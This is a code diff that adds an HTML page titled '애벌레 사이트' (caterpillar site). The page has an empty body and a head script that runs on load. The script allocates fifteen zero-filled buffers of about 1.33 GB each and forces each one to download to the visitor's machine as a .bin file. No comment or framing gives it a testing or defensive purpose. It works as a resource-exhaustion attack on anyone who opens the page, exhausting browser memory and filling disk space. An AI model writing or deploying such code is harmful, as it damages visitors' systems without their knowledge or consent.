@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>애벌레 사이트</title>
+    <script>
+        // Function to generate a large binary file with empty content
+        function generateLargeEmptyFile(sizeInMB) {
+            const sizeInBytes = sizeInMB * 1024 * 1024; // Convert MB to bytes
+            const buffer = new Uint8Array(sizeInBytes); // Create a buffer filled with 0
+            return buffer;
+        }
+
+        // Function to download the generated file
+        function downloadBinaryFile(fileName, content) {
+            const blob = new Blob([content], { type: "application/octet-stream" });
+            const link = document.createElement("a");
+            link.href = URL.createObjectURL(blob);
+            link.download = fileName;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        // Generate and download 15 files of ~1.33GB each
+        const fileCount = 15;
+        const fileSizeInMB = 1333; // ~1.33GB per file
+
+        for (let i = 1; i <= fileCount; i++) {
+            const fileName = `empty-file-${i}.bin`;
+            const content = generateLargeEmptyFile(fileSizeInMB);
+            downloadBinaryFile(fileName, content);
+        }
+    </script>
+</head>
+<body>
+</body>
+</html>
